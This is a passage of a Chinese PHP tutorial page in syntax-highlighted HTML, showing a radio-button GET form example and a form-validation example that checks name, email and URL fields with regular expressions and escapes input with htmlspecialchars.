\n<h3 id=\"表单\"><a href=\"#表单\" class=\"headerlink\" title=\"表单\"></a>表单</h3><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$q</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'q'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">?</span> <span class=\"token function\">htmlspecialchars</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'q'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">:</span> <span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$q</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$q</span> <span class=\"token operator\">==</span><span class=\"token string single-quoted-string\">'RUNOOB'</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n                <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'菜鸟教程&lt;br&gt;http://www.runoob.com'</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$q</span> <span class=\"token operator\">==</span><span class=\"token string single-quoted-string\">'GOOGLE'</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n                <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'Google 搜索&lt;br&gt;http://www.google.com'</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$q</span> <span class=\"token operator\">==</span><span class=\"token string single-quoted-string\">'TAOBAO'</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n                <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'淘宝&lt;br&gt;http://www.taobao.com'</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span>\n<span class=\"token delimiter important\">?&gt;</span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>form</span> <span class=\"token attr-name\">action</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span><span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">method</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>get<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span> \n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>radio<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>q<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">value</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>RUNOOB<span class=\"token punctuation\">\"</span></span> <span class=\"token punctuation\">/&gt;</span></span>Runoob\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>radio<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>q<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">value</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>GOOGLE<span class=\"token punctuation\">\"</span></span> <span class=\"token punctuation\">/&gt;</span></span>Google\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>radio<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>q<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">value</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>TAOBAO<span class=\"token punctuation\">\"</span></span> <span class=\"token punctuation\">/&gt;</span></span>Taobao\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>submit<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">value</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>提交<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>form</span><span class=\"token punctuation\">&gt;</span></span>\n<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token delimiter important\">?&gt;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"表单验证\"><a href=\"#表单验证\" class=\"headerlink\" title=\"表单验证\"></a>表单验证</h3><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token doctype\"><span class=\"token punctuation\">&lt;!</span><span class=\"token doctype-tag\">DOCTYPE</span> <span class=\"token name\">HTML</span><span class=\"token punctuation\">&gt;</span></span> \n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>html</span><span class=\"token punctuation\">&gt;</span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>head</span><span class=\"token punctuation\">&gt;</span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>meta</span> <span class=\"token attr-name\">charset</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>utf-8<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>title</span><span class=\"token punctuation\">&gt;</span></span>菜鸟教程(runoob.com)<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>title</span><span class=\"token punctuation\">&gt;</span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>style</span><span class=\"token punctuation\">&gt;</span></span><span class=\"token style\"><span class=\"token language-css\">\n<span class=\"token selector\">.error</span> <span class=\"token punctuation\">{</span><span class=\"token property\">color</span><span class=\"token punctuation\">:</span> #FF0000<span class=\"token punctuation\">;</span><span class=\"token punctuation\">}</span>\n</span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>style</span><span class=\"token punctuation\">&gt;</span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>head</span><span class=\"token punctuation\">&gt;</span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>body</span><span class=\"token punctuation\">&gt;</span></span> \n\n<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token comment\">// 定义变量并默认设置为空值</span>\n<span class=\"token variable\">$nameErr</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$emailErr</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$genderErr</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$websiteErr</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$name</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$email</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$gender</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$comment</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$website</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"REQUEST_METHOD\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token string double-quoted-string\">\"POST\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">empty</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"name\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">{</span>\n        <span class=\"token variable\">$nameErr</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"名字是必需的\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">else</span>\n    <span class=\"token punctuation\">{</span>\n        <span class=\"token variable\">$name</span> <span class=\"token operator\">=</span> <span class=\"token function\">test_input</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"name\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">// 检测名字是否只包含字母跟空格</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/^[a-zA-Z ]*$/\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$name</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">{</span>\n            <span class=\"token variable\">$nameErr</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"只允许字母和空格\"</span><span class=\"token punctuation\">;</span> \n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n    \n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">empty</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"email\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">{</span>\n      <span class=\"token variable\">$emailErr</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"邮箱是必需的\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">else</span>\n    <span class=\"token punctuation\">{</span>\n        <span class=\"token variable\">$email</span> <span class=\"token operator\">=</span> <span class=\"token function\">test_input</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"email\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">// 检测邮箱是否合法</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/([\\w\\-]+\\@[\\w\\-]+\\.[\\w\\-]+)/\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$email</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">{</span>\n            <span class=\"token variable\">$emailErr</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"非法邮箱格式\"</span><span class=\"token punctuation\">;</span> \n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n    \n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">empty</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"website\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">{</span>\n        <span class=\"token variable\">$website</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">else</span>\n    <span class=\"token punctuation\">{</span>\n        <span class=\"token variable\">$website</span> <span class=\"token operator\">=</span> <span class=\"token function\">test_input</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"website\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">// 检测 URL 地址是否合法</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/\\b(?:(?:https?|ftp):\\/\\/|www\\.)[-a-z0-9+&amp;@#\\/%?=~_|!:,.;]*[-a-z0-9+&amp;@#\\/%=~_|]/i\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$website</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">{</span>\n            <span class=\"token variable\">$websiteErr</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"非法的 URL 的地址\"</span><span class=\"token punctuation\">;</span> \n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n    \n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">empty</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"comment\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">{</span>\n        <span class=\"token variable\">$comment</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">else</span>\n    <span class=\"token punctuation\">{</span>\n        <span class=\"token variable\">$comment</span> <span class=\"token operator\">=</span> <span class=\"token function\">test_input</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"comment\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    \n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">empty</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"gender\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">{</span>\n        <span class=\"token variable\">$genderErr</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"性别是必需的\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">else</span>\n    <span class=\"token punctuation\">{</span>\n        <span class=\"token variable\">$gender</span> <span class=\"token operator\">=</span> <span class=\"token function\">test_input</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"gender\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">function</span> <span class=\"token function-definition function\">test_input</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$data</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">{</span>\n    <span class=\"token variable\">$data</span> <span class=\"token operator\">=</span> <span class=\"token function\">trim</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$data</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$data</span> <span class=\"token operator\">=</span> <span class=\"token function\">stripslashes</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$data</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$data</span> <span class=\"token operator\">=</span> <span class=\"token function\">htmlspecialchars</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$data</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">return</span> <span class=\"token variable\">$data</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token delimiter important\">?&gt;</span></span>\n\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>h2</span><span class=\"token punctuation\">&gt;</span></span>PHP 表单验证实例<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>h2</span><span class=\"token punctuation\">&gt;</span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>p</span><span class=\"token punctuation\">&gt;</span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>span</span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>error<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>* 必需字段。<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>span</span><span class=\"token punctuation\">&gt;</span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>p</span><span class=\"token punctuation\">&gt;</span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>form</span> <span class=\"token attr-name\">method</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>post<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">action</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token keyword\">echo</span> <span class=\"token function\">htmlspecialchars</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"PHP_SELF\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?&gt;</span></span><span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span> \n   名字: <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>text<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>name<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">value</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token keyword\">echo</span> <span class=\"token variable\">$name</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?&gt;</span></span><span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>\n   <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>span</span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>error<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>* <span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token keyword\">echo</span> <span class=\"token variable\">$nameErr</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?&gt;</span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>span</span><span class=\"token punctuation\">&gt;</span></span>\n   <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>br</span><span class=\"token punctuation\">&gt;</span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>br</span><span class=\"token punctuation\">&gt;</span></span>\n   E-mail: <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>text<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>email<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">value</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token keyword\">echo</span> <span class=\"token variable\">$email</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?&gt;</span></span><span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>\n   <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>span</span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>error<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>* <span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token keyword\">echo</span> <span class=\"token variable\">$emailErr</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?&gt;</span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>span</span><span class=\"token punctuation\">&gt;</span></span>\n   <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>br</span><span class=\"token punctuation\">&gt;</span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>br</span><span class=\"token punctuation\">&gt;</span></span>\n   网址: <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>text<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>website<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">value</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token keyword\">echo</span> <span class=\"token variable\">$website</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?&gt;</span></span><span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>\n   <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>span</span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>error<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token keyword\">echo</span> <span class=\"token variable\">$websiteErr</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?&gt;</span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>span</span><span class=\"token punctuation\">&gt;</span></span>\n   <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>br</span><span class=\"token punctuation\">&gt;</span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>br</span><span class=\"token punctuation\">&gt;</span></span>\n   备注: <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>textarea</span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>comment<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">rows</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>5<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">cols</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>40<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token keyword\">echo</span> <span class=\"token variable\">$comment</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?&gt;</span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>textarea</span><span class=\"token punctuation\">&gt;</span></span>\n   <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>br</span><span class=\"token punctuation\">&gt;</span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>br</span><span class=\"token punctuation\">&gt;</span></span>\n   性别:\n   <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>radio<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>gender<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$gender</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token variable\">$gender</span><span class=\"token operator\">==</span><span class=\"token string double-quoted-string\">\"female\"</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"checked\"</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?&gt;</span></span></span>  <span class=\"token attr-name\">value</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>female<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>女\n   <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>radio<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>gender<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$gender</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token variable\">$gender</span><span class=\"token operator\">==</span><span class=\"token string double-quoted-string\">\"male\"</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"checked\"</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?&gt;</span></span></span>  <span class=\"token attr-name\">value</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>male<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>男\n   <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>span</span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token 